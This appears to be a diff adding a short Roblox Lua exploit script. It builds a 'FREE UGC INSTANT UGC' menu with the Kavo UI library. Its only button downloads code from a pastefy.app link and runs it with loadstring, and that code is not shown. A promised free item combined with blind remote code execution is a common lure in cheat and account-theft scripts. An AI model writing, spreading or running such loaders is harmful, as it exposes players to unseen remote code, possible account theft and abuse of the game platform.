@@ -1,0 +1,14 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+
+
+local Window = Library.CreateLib("BigBestNoobScripts", "Ocean")
+
+local Tab = Window:NewTab("FREE UGC INSTANT UGC")
+
+local Section = Tab:NewSection("FREE UGC INSTANT UGC")
+
+
+Section:NewButton("INSTATE UGC", "ButtonInfo", function()
+   
+loadstring(game:HttpGet(('https://pastefy.app/gSC0hnq2/raw'),true))()
+end)
